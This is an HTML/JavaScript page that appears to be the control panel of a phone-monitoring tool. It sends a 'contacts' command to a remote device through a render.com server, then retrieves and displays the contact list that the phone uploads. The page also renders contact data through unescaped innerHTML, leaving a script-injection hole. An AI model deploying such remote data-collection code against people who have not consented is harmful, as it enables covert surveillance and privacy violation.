<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contacts - Device Control</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0f0f0f;
            --glass-bg: rgba(255, 255, 255, 0.1);
            --glass-border: rgba(255, 255, 255, 0.2);
            --text-main: #ffffff;
            --text-muted: #aaaaaa;
            --accent: #4caf50;
        }

        body {
            background-color: var(--bg-color);
            background-image: linear-gradient(45deg, #000000, #1a1a1a);
            color: var(--text-main);
            font-family: 'Segoe UI', sans-serif;
            margin: 0; padding: 10px;
            display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 450px;
            background: rgba(0, 0, 0, 0.5);
            border-radius: 30px; padding: 20px;
            border: 1px solid var(--glass-border);
            min-height: 80vh;
        }

        .header {
            display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 15px; padding-bottom: 10px;
            border-bottom: 1px solid var(--glass-border);
        }

        #apiStatus {
            background: rgba(0, 243, 255, 0.05);
            font-size: 11px; padding: 10px; border-radius: 12px;
            margin-bottom: 15px; border-left: 3px solid #00f3ff;
            color: #00f3ff; font-family: monospace;
        }

        .back-btn {
            color: var(--text-main); font-size: 1.2rem;
            text-decoration: none; display: flex; align-items: center; justify-content: center;
            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
        }

        .contact-list {
            display: flex; flex-direction: column; gap: 10px;
            max-height: 550px; overflow-y: auto; padding-right: 5px;
        }

        .contact-card {
            background: var(--glass-bg); padding: 12px;
            border-radius: 15px; display: flex; align-items: center;
            border: 1px solid var(--glass-border);
        }

        .avatar {
            width: 38px; height: 38px;
            background: linear-gradient(45deg, #4caf50, #2e7d32);
            border-radius: 50%; display: flex; align-items: center; justify-content: center;
            font-weight: bold; margin-right: 15px; flex-shrink: 0;
        }

        .info { flex: 1; }
        .name { font-size: 0.95rem; font-weight: 500; color: #fff; }
        .number { font-size: 0.8rem; color: var(--text-muted); }

        .refresh-btn {
            background: var(--accent); border: none; color: white;
            padding: 8px 15px; border-radius: 20px; cursor: pointer; font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
            <span class="page-title">Contacts</span>
            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn">Refresh</button>
        </div>

        <div id="apiStatus">Initializing...</div>

        <div class="contact-list" id="contactsContainer">
            <div style="text-align: center; color: #666; margin-top: 50px;">Waiting for data...</div>
        </div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com";
        const urlParams = new URLSearchParams(window.location.search);
        
        // ID ko hamesha uppercase rakhein server se match karne ke liye
        const DEVICE_ID = urlParams.get('id') ? urlParams.get('id').toUpperCase() : null;
        const storageKey = `contacts_${DEVICE_ID}`;
        const statusEl = document.getElementById("apiStatus");
        let retryCount = 0;

        function setStatus(msg, isError = false) {
            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
            statusEl.innerHTML = `ðŸ“¡ <strong>Status:</strong> ${msg}`;
        }

        document.addEventListener("DOMContentLoaded", () => {
            if (!DEVICE_ID) {
                setStatus("Error: Device ID missing!", true);
                return;
            }
            setStatus(`Device ID: ${DEVICE_ID} detected.`);
            
            // 1. Local storage se purana data dikhao
            loadFromStorage();
            
            // 2. Automatically phone ko command bhejo aur data fetch karo
            handleRefresh();
        });

        function loadFromStorage() {
            const saved = localStorage.getItem(storageKey);
            if (saved) {
                renderContacts(JSON.parse(saved));
            }
        }

        function handleRefresh() {
            retryCount = 0;
            sendCommand();
            // 5 second baad pehla check karein (Phone ko upload karne ka time dein)
            setTimeout(fetchData, 5000);
        }

        function sendCommand() {
            setStatus("Sending 'contacts' command to phone...");
            fetch(`${SERVER_URL}/api/send-command`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ device_id: DEVICE_ID, command: 'contacts' })
            }).then(res => res.json())
              .then(data => console.log("Command queued:", data));
        }

        function fetchData() {
            const btn = document.getElementById("refreshBtn");
            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
            
            const apiURL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/contacts?t=${Date.now()}`;

            fetch(apiURL)
                .then(res => res.json())
                .then(data => {
                    if (!data || data.length === 0) {
                        if (retryCount < 5) {
                            retryCount++;
                            setStatus(`Waiting for phone upload (Attempt ${retryCount}/5)...`);
                            setTimeout(fetchData, 5000); // Har 5 sec mein check karo
                        } else {
                            setStatus("Phone offline ya permission nahi hai.", true);
                        }
                        return;
                    }

                    // Data mil gaya
                    localStorage.setItem(storageKey, JSON.stringify(data));
                    setStatus(`Successfully received ${data.length} contacts.`);
                    renderContacts(data);
                })
                .catch(err => setStatus("Connection failed: " + err.message, true))
                .finally(() => {
                    btn.innerHTML = 'Refresh';
                });
        }

        function renderContacts(data) {
            const container = document.getElementById("contactsContainer");
            container.innerHTML = "";
            
            // Sort Alphabetically
            data.sort((a, b) => (a.name || "").localeCompare(b.name || ""));

            data.forEach(contact => {
                const name = contact.name || "Unknown";
                const num = contact.number || contact.phone || "No Number";
                container.innerHTML += `
                    <div class="contact-card">
                        <div class="avatar">${name.charAt(0).toUpperCase()}</div>
                        <div class="info">
                            <div class="name">${name}</div>
                            <div class="number">${num}</div>
                        </div>
                    </div>`;
            });
        }
    </script>
</body>
</html>
